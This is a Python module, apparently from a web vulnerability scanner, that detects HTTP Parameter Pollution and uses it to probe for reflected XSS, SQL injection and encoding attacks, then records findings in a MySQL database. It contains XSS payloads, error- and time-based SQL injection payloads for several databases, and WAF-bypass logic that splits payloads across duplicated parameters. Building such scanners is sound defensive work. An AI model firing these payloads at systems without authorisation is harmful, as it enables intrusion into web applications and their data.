import requests
import os
import sys
import json
import urllib.parse
import hashlib
import re
import sql_errors
import difflib
import random
import string
import html
from urllib.parse import urlparse
from timeit import default_timer as timer
from datetime import timedelta
from bs4 import BeautifulSoup 
from selenium.webdriver.chrome.options import Options
from selenium import webdriver
from selenium.webdriver.edge.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import configparser
import mysql.connector
from os.path import dirname
sys.path.append(dirname(dirname(f'{__file__}')))
from v2.yaml_vuln import vuln_extract
from seleniumBot import login_get_cookie_jar

requests_persist=requests.Session()

HTTP_METHODS = (
    requests_persist.get,
    requests_persist.post,
    requests_persist.put,
    requests_persist.delete,
    requests_persist.options,
    requests_persist.patch,
)


def create_webdriver():
    try:
        # Try creating a Chrome webdriver
        chrome_options = Options()
        chrome_options.add_argument("headless")
        return webdriver.Chrome(options=chrome_options)
    except:
        try:
            # Try creating a Firefox webdriver
            firefox_options = webdriver.FirefoxOptions()
            firefox_options.add_argument("headless") 
            return webdriver.Firefox(options=firefox_options)
        except:
            try:
                from selenium.webdriver.edge.options import Options as EdgeOptions
                # Try creating an Edge webdriver
                options = EdgeOptions()
                options.use_chromium = True
                options.add_argument("headless")
                return webdriver.Edge(options=options)
            except:
                raise Exception("No suitable browser found")

def __escape_regexp_char(s):
    s = s.replace(".", "\.")
    s = s.replace("^", "\^")
    s = s.replace("$", "\$")
    s = s.replace("*", "\*")
    s = s.replace("+", "\+")
    s = s.replace("?", "\?")
    s = s.replace("{", "\{")
    s = s.replace("}", "\}")
    s = s.replace("[", "\[")
    s = s.replace("]", "\]")
    s = s.replace("(", "\(")
    s = s.replace(")", "\)")
    s = s.replace("|", "\|")
    return s

def __concatenation_check(body, v1, v2):
    v1 = __escape_regexp_char(v1.lower())
    v2 = __escape_regexp_char(v2.lower())
    regexp = "[^a-zA-Z0-9]%s %s[^a-zA-Z0-9]" % (v1, v2)
    if re.search(regexp, body, re.M):
        return "v1 v2"

    regexp = "[^a-zA-Z0-9]%s%s[^a-zA-Z0-9]" % (v1, v2)
    if re.search(regexp, body, re.M):
        return "v1v2"

    regexp = "[^a-zA-Z0-9]%s[^<>=]{1,5}%s[^a-zA-Z0-9]" % (
        v1,
        v2,
    )  # the {1,5} should remove the FP
    m = re.search(regexp, body, re.M)
    if m != None: # This means there's a separator in between
        return "v1.v2"

def __parse_body(body, v1, v2):
    val = __concatenation_check(body,v1,v2)
    if val != None:
        return val
    # error tests
    return sql_errors.sql_error_check(body, f"{execution_path}/errors.xml")

def __xss_attribute_check(body,payload_attr,payload_value):
    soup = BeautifulSoup(body,"html.parser")
    for tag in soup.find_all(True):
        for k,v in tag.attrs.items():
            if k == payload_attr and v == payload_value:
                return True
    return False

def __xss_triggered_check(url):
    browser.get(url)
    try:
        WebDriverWait(browser, 3).until(EC.alert_is_present(),'Timed out')
        alert = browser.switch_to.alert
        alert.accept()
        return True
    except:
        return False

def __search_for_url(param,response_body):
    soup = BeautifulSoup(response_body,"html.parser")
    for tag in soup.find_all(True):
        for k,v in tag.attrs.items():
            if param in v:
                return True

"""
Next Steps:
    - Obtain hash of original page
    - Obtain hash of modified page 1
    - Obtain hash of modified page 2
"""


def random_chars(no):
    return "".join(random.choice(string.ascii_letters) for x in range(no))


def check_precedence(baseurl, url, method,params):
    for _method in HTTP_METHODS:
        if _method.__name__.upper() == method.upper():
            og_resp = _method(url)
            og_hash = hashlib.sha1(og_resp.text.encode()).hexdigest()
            for m in re.finditer(
                "([^&=]+)=([^&$]*)", params
            ):  # Just need to check precedence of parameter
                u2_hash = ""
                u_after_hash = ""
                name = m.group(1)
                value = m.group(2)
                if value == "":
                    new_value = "foo"
                elif value.isdigit():
                    new_value = str(int(value) + 1)
                else:
                    if value[:2] != "ab":
                        new_value = "ab" + value[2:]
                    elif value[:2] == "ab":
                        new_value = "cd" + value[2:]
                # Set min value size of 3
                if len(new_value) == 1:
                    new_value += "99"
                elif len(new_value) == 2:
                    new_value += "9"

                u2 = (
                    baseurl
                    + "?"
                    + params.replace(
                        "%s=%s" % (name, value), "%s=%s" % (name, new_value)
                    )
                )
                u_after = (
                    baseurl
                    + "?"
                    + params.replace(
                        "%s=%s" % (name, value),
                        "%s=%s&%s=%s" % (name, value, name, new_value),
                    )
                )
                u2_resp = _method(u2)
                u2_hash = hashlib.sha1(u2_resp.text.encode()).hexdigest()
                u_after_resp = _method(u_after)
                u_after_hash = hashlib.sha1(u_after_resp.text.encode()).hexdigest()

                if (
                    og_hash == u2_hash == u_after_hash
                ):  # All 3 pages the same, parameters does nothing
                    broken_page = True
                    continue  # Keep trying all parameters to make sure
                elif (
                    og_hash == u_after_hash and u2_hash != u_after_hash
                ):  # Only first occurance used
                    # print("First occurrence of Parameter:%s " % (name))
                    return {"par":name,"log":"b [%s = %s -> %s]" % (name, value, new_value)}
                elif (
                    og_hash != u_after_hash and u2_hash == u_after_hash
                ):  # Only last occurance used
                    # print("Last occurrence of Parameter:%s" % (name))
                    return {"par":name,"log":"a [%s = %s -> %s]" % (name, value, new_value)}
                else:  # All 3 pages different, this happens when there are dynamic contents (eg. current datetime)
                    precedence = __parse_body(u_after_resp.text, value, new_value)
                    if precedence != -1:  # SQL Error or concatentation
                        return {"par":name,"log":"%s [%s = %s -> %s]" % (
                            precedence,
                            name,
                            value,
                            new_value,
                        )}
                    else:  # Not SQL Error, No concatenation, Check how much the parameter changes the page
                        b = difflib.SequenceMatcher(  # How similar is it?
                            None, u_after_resp.text, og_resp.text
                        )
                        a = difflib.SequenceMatcher(  # How similar is it?
                            None, u_after_resp.text, u2_resp.text
                        )
                        b_ratio = b.ratio()  # Obtain ratio
                        a_ratio = a.ratio()  # Obtain ratio
                        if b_ratio > a_ratio and b_ratio >= 0.75:
                            return {"par":name,"log":"b [%s = %s -> %s]" % (name, value, new_value)}
                        if a_ratio > b_ratio and a_ratio >= 0.75:
                            return {"par":name,"log":"a [%s = %s -> %s]" % (name, value, new_value)}
                    broken_page = False
                    continue  # Keep trying all parameters to make sure it is not unknown
            if broken_page:
                return -3  # broken page, parameters does nothing
            else:
                return -1  # Unknown


def check_for_reflected(baseurl, url, method,params):
    reflected_dict = {"Reflected URL": [], "Reflected Par": []}
    for _method in HTTP_METHODS:
        if _method.__name__.upper() == method.upper():
            # Checking for reflected URL
            for m in re.finditer("([^&=]+)=([^&$]*)", params):
                par = m.group(1)
                val = m.group(2)

                if val == "":
                    new_value = random_chars(10)
                elif val.isdigit():
                    new_value = str(int(val) + 1)
                else:
                    new_value = random_chars(len(val))
                new_url = (
                    baseurl
                    + "?"
                    + params.replace("%s=%s" % (par, val), "%s=%s" % (par, new_value))
                )
                resp = _method(new_url)
                if re.search(
                    f"([^a-zA-Z0-9]{new_value}[^a-zA-Z0-9])|([^a-zA-Z0-9]{new_value}$)",
                    resp.text,
                ):  # only need to check if custom values are reflected
                    reflected_dict["Reflected Par"].append({
                        "name":par,
                        "value":new_value
                    })
                # print(resp.text)
                bool_val = __search_for_url(new_value,html.unescape(resp.text))
                if bool_val:
                    reflected_dict["Reflected URL"].append({
                        "name":par,
                        "value":new_value
                    })
            return reflected_dict


def url_encoding_attack(reflected_url_par,baseurl,method,params):
    list_of_pars = [d['name'] for d in reflected_url_par]
    new_value = "%26malicious%3Dbad"
    for _method in HTTP_METHODS:
        if _method.__name__.upper() == method.upper():
            for m in re.finditer("([^&=]+)=([^&$]*)", params):
                name = m.group(1)
                value = m.group(2)
                if name in list_of_pars:
                    new_url = (
                        baseurl
                        + "?"
                        + params.replace(
                            "%s=%s" % (name, value), "%s=%s" % (name, (value+new_value))
                        )
                    )
                    resp = _method(new_url)
                    if f"{name}={value}&malicious=bad" in html.unescape(resp.text):
                        return [new_url,True]
                    #Attempt Bypass, order param cannot be used here because if full url was returned, the order would be wrong.
                    new_url = (
                        baseurl
                        + "?"
                        + params.replace(
                            "%s=%s" % (name, value), "%s=%s&%s=%s" % (name,value,name, (value+new_value))
                        )
                    )
                    resp = _method(new_url)
                    if f"{name}={value}&malicious=bad" in html.unescape(resp.text):
                        return [new_url,True]
                    
                    new_url = (
                        baseurl
                        + "?"
                        + params.replace(
                            "%s=%s" % (name, value), "%s=%s&%s=%s" % (name,(value+new_value),name, value)
                        )
                    )
                    resp = _method(new_url)
                    if f"{name}={value}&malicious=bad" in html.unescape(resp.text):
                        return [new_url,True]
                    
            return [None,False]


def simple_xss_attack(parameters, baseurl, url, method,params, order): # Switch to selenium for checking if alert was triggered https://stackoverflow.com/questions/19003003/check-if-any-alert-exists-using-selenium-with-python
    list_of_pars = [d['name'] for d in parameters]
    attr_name = "onmouseover"
    attr_value = "alert(1)"
    list_of_payloads = ["<script>alert(1)</script>",'"%s=\'%s\'' % (attr_name,attr_value)]
    for _method in HTTP_METHODS:
        if _method.__name__.upper() == method.upper():
            # Checking for reflected URL
            for m in re.finditer("([^&=]+)=([^&$]*)", params):
                if m.group(1) in list_of_pars:
                    for new_value in list_of_payloads:
                        #Maybe some input validation/output sanitization in place, exploit order to try and bypass
                        if(order == "b"):
                            #Try and insert a valid query to the second occurrence
                            #Assuming that it extracts parameter before, but checks the last occurrence
                            new_url = (
                                baseurl
                                + "?"
                                + params.replace(
                                    "%s=%s" % (m.group(1), m.group(2)), "%s=%s&%s=%s" % (m.group(1), new_value, m.group(1),m.group(2))
                                )
                            )
                        else:
                            #Assuming that it extracts parameter after, but checks the first occurrence
                            new_url = (
                                baseurl
                                + "?"
                                + params.replace(
                                    "%s=%s" % (m.group(1), m.group(2)), "%s=%s&%s=%s" % (m.group(1), m.group(2), m.group(1),new_value)
                                )
                            )
                        rxss = __xss_triggered_check(new_url)
                        if(rxss == False):
                            xss = __xss_attribute_check(browser.page_source,attr_name,attr_value)
                        else:
                            xss = True
                        if xss:
                            return [new_url,True]
                    return [None,False]
                        
                else:
                    continue

            return [None,False] #Return false after all parameters have been evaluated

def check_for_dup_par_concat(baseurl, method, params, val1, val2, time=False):
    #val1 and val2 are slices of a single payload
    list_of_resp = []
    for _method in HTTP_METHODS:
        if _method.__name__.upper() == method.upper():
            for m in re.finditer("([^&=]+)=([^&$]*)", params):
                name = m.group(1)
                value = m.group(2) 
                new_url = (
                        baseurl
                        + "?"
                        + params.replace(
                            "%s=%s" % (name, value), "%s=%s&%s=%s" % (name, val1, name, val2)
                        )
                    )
                if time:
                    start = timer()
                resp = _method(new_url)
                if time:
                    end = timer()
                time_elapsed = timedelta(seconds=end-start) if time else 0
                list_of_resp.append([resp,new_url,time_elapsed])
            return list_of_resp

def check_for_simple_sql(baseurl, method, params, order): # Attempt double parameter injection to bypass WAF
    error_based_payloads = ["'",'"']
    delay_time_s = 5 #Only allow up to 2 digits
    time_based_payloads = [
    "' AND IF ((SELECT SLEEP({})),1,0) -- -", # Incase multiline execution is prevented
    "' WAITFOR DELAY '00:00:{:02}'-- -",
    "' AND 1=(SELECT 1 FROM PG_SLEEP({})) -- -",
    "' AND 1=dbms_pipe.receive_message(('a'),{})-- -",
    ]
    sqli = False
    for _method in HTTP_METHODS:
        if _method.__name__.upper() == method.upper():
            og_resp = _method(baseurl)
            og_status = og_resp.status_code
            #Insert error based_payloads (Straight Forward)
            for m in re.finditer("([^&=]+)=([^&$]*)", params):
                name = m.group(1)
                value = m.group(2) 
                for i in error_based_payloads:
                    list_of_resp = check_for_dup_par_concat(baseurl,method,params,value,i)
                    for resp,new_url,time in list_of_resp:
                        if(resp.status_code != og_status and resp.status_code != 403): #Makes sure WAF is not returning 403/ WAF Blocking payload
                            print("Change in status code, possible SQLI")
                            return [new_url,True]
                        sql_error = sql_errors.sql_error_check(resp.text,f"{execution_path}/errors.xml")
                        if(sql_error != -1):
                            print(f"SQL Error detected for {sql_error} database")
                            return [new_url,True]
                    if(not sqli):
                        if(order == "b"):
                            #Assumming validation was done on last occurrence
                            new_url = (
                                baseurl
                                + "?"
                                + params.replace(
                                    "%s=%s" % (name, value), "%s=%s&%s=%s" % (name, i, name, value)
                                )
                            )
                        else:
                            new_url = (
                                baseurl
                                + "?"
                                + params.replace(
                                    "%s=%s" % (name, value), "%s=%s&%s=%s" % (name, value, name, i)
                                )
                            )
                        resp = _method(new_url)
                        if(resp.status_code != og_status and resp.status_code != 403): #Makes sure WAF is not returning 403/ WAF Blocking payload
                            print("Change in status code, possible SQLI")
                            return [new_url,True]
                        sql_error = sql_errors.sql_error_check(resp.text,f"{execution_path}/errors.xml")
                        if(sql_error != -1):
                            print(f"SQL Error detected for {sql_error} database")
                            return [new_url,True]
                for i in time_based_payloads:
                
                    list_of_resp = check_for_dup_par_concat(baseurl,method,params,i[:len(i)//2],i[len(i)//2:],time=True)# This requires an idea of whether first/second param was used
                    for resp, new_url,time in list_of_resp:
                        if(time >= timedelta(seconds=delay_time_s)):
                            print("Timebased SQLi found")
                            return [new_url,True]
                    if(order == "b"):
                        #Assumming validation was done on last occurrence
                        new_url = (
                            baseurl
                            + "?"
                            + params.replace(
                                "%s=%s" % (name, value), "%s=%s&%s=%s" % (name, i, name, value)
                            )
                        )
                    else:
                        new_url = (
                            baseurl
                            + "?"
                            + params.replace(
                                "%s=%s" % (name, value), "%s=%s&%s=%s" % (name, value, name, i)
                            )
                        )
                    start = timer()
                    resp = _method(new_url)
                    end = timer()
                    if timedelta(seconds=end - start) >= timedelta(seconds=delay_time_s):
                        return [new_url,True]
            return [None,False]

def dup_xss_attack(par, baseurl, method, params):
    #Concatenated 
    attr_name = "onmouseover"
    attr_value = "alert(1)"
    xss = False
    list_of_payloads = ["<script>alert(1)</script>",'"%s=\'%s\'' % (attr_name, attr_value)]
    for _method in HTTP_METHODS:
        if _method.__name__.upper() == method.upper():
            for m in re.finditer("([^&=]+)=([^&$]*)", params):
                name = m.group(1)
                value = m.group(2)
                if par == name:
                    #parameter where concatenation works
                    for payload in list_of_payloads:
                        new_url = (
                            baseurl
                            + "?"
                            + params.replace(
                                "%s=%s" % (name, value), "%s=%s&%s=%s" % (name, payload[:len(payload)//2],name,payload[len(payload)//2:])
                            )
                        )
                        rxss = __xss_triggered_check(new_url)
                        if(rxss == False):
                            xss = __xss_attribute_check(browser.page_source,attr_name,attr_value)
                        else:
                            xss = True
                        if xss:
                            return [new_url,True]
            return [None,False]
        
if __name__ == "__main__":
    user_input = sys.argv[1] # this is the domain
    scan_id = int(sys.argv[2])

parsed_url = urlparse(user_input)
scheme = parsed_url.scheme
netloc = parsed_url.netloc
url = scheme + "://" + netloc

config = configparser.ConfigParser()
config.read("config.ini")
username = config.get('Advanced Scan Settings','scraping_username')
password = config.get('Advanced Scan Settings','scraping_password')
session_cookie = login_get_cookie_jar(url, username, password)
if session_cookie == -1 :
    sys.exit(0)
requests_persist.cookies = session_cookie
browser = create_webdriver()
for cookie in session_cookie:
    browser.add_cookie({'name':cookie.name,'value':cookie.value,'path':cookie.path})
vulnerable_dict = {
    "xss":set(),
    "sqli":set(),
    "encoding_attack":set()
}

execution_path = os.path.dirname(__file__)
query_url = []
with open(f"crawl.txt") as file:
    for line in file.readlines():
        json_line = json.loads(line)
        if "?" in json_line["URL"] and json_line["Method"] != None and json_line["Method"] == 'GET':
            query_url.append([json_line["URL"], json_line["Method"]])
for url, method in query_url:
    url_obj = urllib.parse.urlparse(url)
    baseurl = url_obj[0] + "://" + url_obj[1] + url_obj[2]
    params = url_obj.query
    before_par = check_precedence(baseurl, url, method,params)
    order = "b"# First occurrence
    xss = None
    xss_2 = None
    sqli = None
    encoding_attack = None
    if before_par != -3 and before_par != -1:
        log = before_par['log']
        par = before_par['par']
        if log.find("a ") == 0:
            order = "a" #Last occurrence
        elif log.find("b ") == 0:
            order = "b"
        reflected_dict = check_for_reflected(baseurl, url, method,params)
        if len(reflected_dict["Reflected URL"]) > 0:#Does not depend on order
            # print(base)
            encoding_attack = url_encoding_attack(reflected_dict['Reflected URL'],baseurl,method,params)
        if len(reflected_dict["Reflected Par"]) > 0:# Might depend on order for validation/sanitization bypass
            xss = simple_xss_attack(reflected_dict['Reflected Par'],baseurl,url,method,params, order)
        sqli = check_for_simple_sql(baseurl,method,params,order)
        if (
            log.find("v1 v2") == 0
            or log.find("v1v2") == 0
        ):# This condition only works if the values are reflected and concatenated. Hence perform XSS test. 
            xss_2 = dup_xss_attack(par, baseurl, method, params)
            # xss = True if xss_2 else xss
        if encoding_attack is not None and encoding_attack[1]:
            vulnerable_dict["encoding_attack"].add(encoding_attack[0])
        if xss is not None and xss[1]:
            vulnerable_dict["xss"].add(xss[0])
        if xss_2 is not None and xss_2[1]:
            vulnerable_dict["xss"].add(xss_2[0])
        if sqli is not None and sqli[1]:
            vulnerable_dict["sqli"].add(sqli[0])
browser.close()

# print(vulnerable_url)
###################### WRITING AFFECTED URLS/ENDPOINTS TO DB #################
if len(vulnerable_dict["encoding_attack"]) > 0 or len(vulnerable_dict["xss"]) > 0 or len(vulnerable_dict["sqli"]) > 0 :
    print("HTTP Parameter Pollution Found")
    config = configparser.ConfigParser()
    config.read("config.ini")
    db_host = config.get('SQL Database', 'db_host')
    db_user = config.get('SQL Database', 'db_user')
    db_password = config.get('SQL Database', 'db_password')

    db_connection = mysql.connector.connect(
        host=db_host,
        user=db_user,
        password=db_password,
        database="vulnerabilities"
    )

    db_cursor = db_connection.cursor()
    cwe_id = "CWE-235"
    # Insert a row into the MySQL table
    vuln_yml = vuln_extract(cwe_id)
    name = vuln_yml["name"]

    insert_query = "INSERT INTO vulnerabilities (scan_id, vulnerability_name, vulnerability_id, url, additional_information) VALUES (%s, %s, %s, %s, %s)"
    values = []
    # hpp_dict = {
    #     "results":vulnerable_url
    # }
    new_vulnerable_dict = {}
    for k,v in vulnerable_dict.items():
        new_vulnerable_dict[k] = list(v)
    hpp_dict_json = json.dumps(new_vulnerable_dict)
    # for line in vulnerable_url:
    values.append([scan_id,name,cwe_id,user_input,hpp_dict_json])
    db_cursor.executemany(insert_query, values)# Insert multiple rows together
    db_connection.commit()

    db_cursor.close()
    db_connection.close()